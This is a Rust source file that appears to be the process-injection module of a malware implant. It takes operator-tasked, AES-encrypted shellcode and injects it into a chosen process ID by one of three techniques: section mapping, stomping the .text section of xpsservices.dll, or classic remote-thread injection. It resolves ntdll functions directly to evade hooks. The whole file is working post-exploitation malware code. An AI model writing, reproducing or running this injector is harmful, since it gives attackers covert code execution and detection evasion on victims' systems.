// inject.rs — Process injection for post-exploitation shellcode delivery.
//
// Three techniques, selected by the operator at dispatch time:
//
//   section_map    NtCreateSection shared mapping — no cross-process write
//   module_stomp   Force-load xpsservices.dll, overwrite .text — MEM_IMAGE backing
//   classic        VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
//
// Wire format from TaskHandler:
//   INJECT:<method>:<pid>:<b64(AES ciphertext)>

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use std::ffi::c_void;
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Module32FirstW, Module32NextW,
    MODULEENTRY32W, TH32CS_SNAPMODULE, TH32CS_SNAPMODULE32,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, WaitForSingleObject,
    PROCESS_ALL_ACCESS,
};

const STOMP_DLL_PATH: &[u8] = b"C:\\Windows\\System32\\xpsservices.dll\0";
const STOMP_DLL_NAME: &str = "xpsservices.dll";

const SEC_COMMIT: u32 = 0x0800_0000;
const SECTION_ALL_ACCESS: u32 = 0x000F_001F;
const VIEW_UNMAP: u32 = 2;

type FnNtCreateSection = unsafe extern "system" fn(
    *mut HANDLE, u32, *mut c_void, *mut i64, u32, u32, *mut c_void,
) -> i32;
type FnNtMapViewOfSection = unsafe extern "system" fn(
    HANDLE, HANDLE, *mut *mut c_void, usize, usize,
    *mut i64, *mut usize, u32, u32, u32,
) -> i32;
type FnNtUnmapViewOfSection = unsafe extern "system" fn(HANDLE, *mut c_void) -> i32;
type FnNtCreateThreadEx = unsafe extern "system" fn(
    *mut HANDLE, u32, *mut c_void, HANDLE, *const c_void,
    *mut c_void, u32, usize, usize, usize, *mut c_void,
) -> i32;
type FnNtWriteVirtualMemory = unsafe extern "system" fn(
    HANDLE, *mut c_void, *const c_void, usize, *mut usize,
) -> i32;
type FnNtReadVirtualMemory = unsafe extern "system" fn(
    HANDLE, *const c_void, *mut c_void, usize, *mut usize,
) -> i32;
type FnNtProtectVirtualMemory = unsafe extern "system" fn(
    HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32,
) -> i32;

unsafe fn resolve_ntdll_fn<T>(name: &[u8]) -> Option<T> {
    let h = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr())).ok()?;
    let p = GetProcAddress(h, PCSTR(name.as_ptr()))?;
    Some(std::mem::transmute_copy(&p))
}

pub fn handle_inject(arg: &str) -> String {
    // arg = "<method>:<pid>:<b64_ciphertext>"
    let parts: Vec<&str> = arg.splitn(3, ':').collect();
    let (method, pid_str, b64_payload) = match parts.as_slice() {
        [m, p, d] => (*m, *p, *d),
        _ => return "inject: expected method:pid:payload".to_string(),
    };
    let pid: u32 = match pid_str.parse() {
        Ok(p) => p,
        Err(_) => return format!("inject: invalid pid '{pid_str}'"),
    };
    let encrypted = match B64.decode(b64_payload.trim()) {
        Ok(b) => b,
        Err(_) => return "inject: invalid base64".to_string(),
    };
    let cfg = unsafe { &*(&raw const crate::config::IMPLANT_CONFIG) };
    let shellcode = match crate::crypto::decrypt_bytes(&encrypted, cfg.key(), cfg.iv()) {
        Ok(sc) => sc,
        Err(e) => return format!("inject: decrypt failed: {e}"),
    };

    let result = unsafe {
        let h_process = match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
            Ok(h) => h,
            Err(e) => return format!("inject: OpenProcess failed: {e}"),
        };
        let ok = match method {
            "section_map"  => inject_section_map(h_process, &shellcode),
            "module_stomp" => inject_module_stomp(h_process, pid, &shellcode),
            "classic"      => inject_classic(h_process, &shellcode),
            _ => return format!("inject: unknown method '{method}'"),
        };
        let _ = CloseHandle(h_process);
        ok
    };
    if result {
        format!("inject: {method} into PID {pid} — executing")
    } else {
        format!("inject: {method} into PID {pid} — failed")
    }
}

// ── section_map ─────────────────────────────────────────────────────────────

unsafe fn inject_section_map(target: HANDLE, shellcode: &[u8]) -> bool {
    let create_sec: FnNtCreateSection = match resolve_ntdll_fn(b"NtCreateSection\0") {
        Some(f) => f, None => return false,
    };
    let map_view: FnNtMapViewOfSection = match resolve_ntdll_fn(b"NtMapViewOfSection\0") {
        Some(f) => f, None => return false,
    };
    let unmap_view: FnNtUnmapViewOfSection = match resolve_ntdll_fn(b"NtUnmapViewOfSection\0") {
        Some(f) => f, None => return false,
    };
    let create_thread: FnNtCreateThreadEx = match resolve_ntdll_fn(b"NtCreateThreadEx\0") {
        Some(f) => f, None => return false,
    };

    let self_handle = HANDLE(-1isize as *mut c_void);

    let mut section = HANDLE::default();
    let mut size = shellcode.len() as i64;
    let st = create_sec(
        &mut section, SECTION_ALL_ACCESS, std::ptr::null_mut(),
        &mut size, PAGE_EXECUTE_READWRITE.0, SEC_COMMIT, std::ptr::null_mut(),
    );
    if st < 0 { return false; }

    let mut local_base: *mut c_void = std::ptr::null_mut();
    let mut local_size: usize = 0;
    let mut offset: i64 = 0;
    let st = map_view(
        section, self_handle, &mut local_base,
        0, shellcode.len(), &mut offset, &mut local_size,
        VIEW_UNMAP, 0, PAGE_READWRITE.0,
    );
    if st < 0 { return false; }

    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_base as *mut u8, shellcode.len());

    let mut remote_base: *mut c_void = std::ptr::null_mut();
    let mut remote_size: usize = 0;
    let mut offset2: i64 = 0;
    let st = map_view(
        section, target, &mut remote_base,
        0, shellcode.len(), &mut offset2, &mut remote_size,
        VIEW_UNMAP, 0, PAGE_EXECUTE_READ.0,
    );
    if st < 0 {
        let _ = unmap_view(self_handle, local_base);
        return false;
    }

    let _ = unmap_view(self_handle, local_base);

    let mut h_thread = HANDLE::default();
    let st = create_thread(
        &mut h_thread, 0x001F_FFFF, std::ptr::null_mut(),
        target, remote_base as *const c_void, std::ptr::null_mut(),
        0, 0, 0, 0, std::ptr::null_mut(),
    );
    if st >= 0 && !h_thread.is_invalid() {
        let _ = CloseHandle(h_thread);
    }
    st >= 0
}

// ── module_stomp ────────────────────────────────────────────────────────────

unsafe fn inject_module_stomp(target: HANDLE, pid: u32, shellcode: &[u8]) -> bool {
    let write_mem: FnNtWriteVirtualMemory = match resolve_ntdll_fn(b"NtWriteVirtualMemory\0") {
        Some(f) => f, None => return false,
    };
    let read_mem: FnNtReadVirtualMemory = match resolve_ntdll_fn(b"NtReadVirtualMemory\0") {
        Some(f) => f, None => return false,
    };
    let protect_mem: FnNtProtectVirtualMemory = match resolve_ntdll_fn(b"NtProtectVirtualMemory\0") {
        Some(f) => f, None => return false,
    };
    let create_thread: FnNtCreateThreadEx = match resolve_ntdll_fn(b"NtCreateThreadEx\0") {
        Some(f) => f, None => return false,
    };

    // Step 1: Allocate remote page for DLL path string
    let remote_path = VirtualAllocEx(
        target, None, STOMP_DLL_PATH.len(),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
    );
    if remote_path.is_null() { return false; }

    // Step 2: Write DLL path into target
    let mut written: usize = 0;
    let st = write_mem(
        target, remote_path, STOMP_DLL_PATH.as_ptr() as *const c_void,
        STOMP_DLL_PATH.len(), &mut written,
    );
    if st < 0 { return false; }

    // Step 3: Resolve LoadLibraryA and remote-thread it
    let h_k32 = match GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())) {
        Ok(h) => h, Err(_) => return false,
    };
    let load_lib = match GetProcAddress(h_k32, PCSTR(b"LoadLibraryA\0".as_ptr())) {
        Some(p) => p, None => return false,
    };

    let mut ll_thread = HANDLE::default();
    let st = create_thread(
        &mut ll_thread, 0x001F_FFFF, std::ptr::null_mut(),
        target, load_lib as *const c_void, remote_path,
        0, 0, 0, 0, std::ptr::null_mut(),
    );
    if st < 0 { return false; }
    WaitForSingleObject(ll_thread, 10_000);
    let _ = CloseHandle(ll_thread);

    // Step 4: Find xpsservices.dll base via toolhelp
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    let snap = match snap {
        Ok(h) => h, Err(_) => return false,
    };

    let mut stomp_base: *mut u8 = std::ptr::null_mut();
    let mut me = MODULEENTRY32W {
        dwSize: std::mem::size_of::<MODULEENTRY32W>() as u32,
        ..std::mem::zeroed()
    };

    if Module32FirstW(snap, &mut me).is_ok() {
        loop {
            let name_len = me.szModule.iter().position(|&c| c == 0).unwrap_or(me.szModule.len());
            let name: String = me.szModule[..name_len].iter().map(|&c| c as u8 as char).collect();
            if name.eq_ignore_ascii_case(STOMP_DLL_NAME) {
                stomp_base = me.modBaseAddr;
                break;
            }
            let mut next = MODULEENTRY32W {
                dwSize: std::mem::size_of::<MODULEENTRY32W>() as u32,
                ..std::mem::zeroed()
            };
            if Module32NextW(snap, &mut next).is_err() { break; }
            me = next;
        }
    }
    let _ = CloseHandle(snap);
    if stomp_base.is_null() { return false; }

    // Step 5: Read PE headers, find first executable section
    let mut hdr_buf = [0u8; 4096];
    let mut bytes_read: usize = 0;
    let st = read_mem(
        target, stomp_base as *const c_void,
        hdr_buf.as_mut_ptr() as *mut c_void, hdr_buf.len(), &mut bytes_read,
    );
    if st < 0 || bytes_read < 0x400 { return false; }

    let (text_rva, text_size) = match parse_first_exec_section(&hdr_buf) {
        Some(p) => p, None => return false,
    };
    if (text_size as usize) < shellcode.len() { return false; }
    let text_remote = stomp_base.add(text_rva as usize);

    // Step 6: Flip .text RW → write shellcode → flip RX
    let mut prot_base = text_remote as *mut c_void;
    let mut prot_size = shellcode.len();
    let mut old_prot: u32 = 0;
    let st = protect_mem(target, &mut prot_base, &mut prot_size, PAGE_READWRITE.0, &mut old_prot);
    if st < 0 { return false; }

    let mut written: usize = 0;
    let st = write_mem(
        target, text_remote as *mut c_void,
        shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written,
    );
    if st < 0 { return false; }

    let mut prot_base2 = text_remote as *mut c_void;
    let mut prot_size2 = shellcode.len();
    let mut old_prot2: u32 = 0;
    let _ = protect_mem(target, &mut prot_base2, &mut prot_size2, PAGE_EXECUTE_READ.0, &mut old_prot2);

    // Step 7: Create thread at stomped .text
    let mut h_thread = HANDLE::default();
    let st = create_thread(
        &mut h_thread, 0x001F_FFFF, std::ptr::null_mut(),
        target, text_remote as *const c_void, std::ptr::null_mut(),
        0, 0, 0, 0, std::ptr::null_mut(),
    );
    if st >= 0 && !h_thread.is_invalid() {
        let _ = CloseHandle(h_thread);
    }
    st >= 0
}

fn parse_first_exec_section(hdr: &[u8]) -> Option<(u32, u32)> {
    if hdr.len() < 0x40 { return None; }
    let e_lfanew = u32::from_le_bytes([hdr[0x3C], hdr[0x3D], hdr[0x3E], hdr[0x3F]]) as usize;
    if e_lfanew + 24 >= hdr.len() { return None; }
    if &hdr[e_lfanew..e_lfanew + 4] != b"PE\0\0" { return None; }
    let num_sec = u16::from_le_bytes([hdr[e_lfanew + 6], hdr[e_lfanew + 7]]) as usize;
    let size_opt = u16::from_le_bytes([hdr[e_lfanew + 20], hdr[e_lfanew + 21]]) as usize;
    let first = e_lfanew + 24 + size_opt;
    const SCN_MEM_EXECUTE: u32 = 0x2000_0000;
    for i in 0..num_sec {
        let s = first + i * 40;
        if s + 40 > hdr.len() { return None; }
        let virt_size = u32::from_le_bytes([hdr[s + 8], hdr[s + 9], hdr[s + 10], hdr[s + 11]]);
        let virt_rva = u32::from_le_bytes([hdr[s + 12], hdr[s + 13], hdr[s + 14], hdr[s + 15]]);
        let chars = u32::from_le_bytes([hdr[s + 36], hdr[s + 37], hdr[s + 38], hdr[s + 39]]);
        if (chars & SCN_MEM_EXECUTE) != 0 {
            return Some((virt_rva, virt_size));
        }
    }
    None
}

// ── classic ─────────────────────────────────────────────────────────────────

unsafe fn inject_classic(target: HANDLE, shellcode: &[u8]) -> bool {
    let remote_mem = VirtualAllocEx(
        target, None, shellcode.len(),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    );
    if remote_mem.is_null() { return false; }

    let write_mem: FnNtWriteVirtualMemory = match resolve_ntdll_fn(b"NtWriteVirtualMemory\0") {
        Some(f) => f, None => return false,
    };
    let mut written: usize = 0;
    let st = write_mem(
        target, remote_mem, shellcode.as_ptr() as *const c_void,
        shellcode.len(), &mut written,
    );
    if st < 0 { return false; }

    let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(remote_mem);
    match CreateRemoteThread(target, None, 0, Some(thread_fn), Some(remote_mem), 0, None) {
        Ok(h) => { let _ = CloseHandle(h); true }
        Err(_) => false,
    }
}
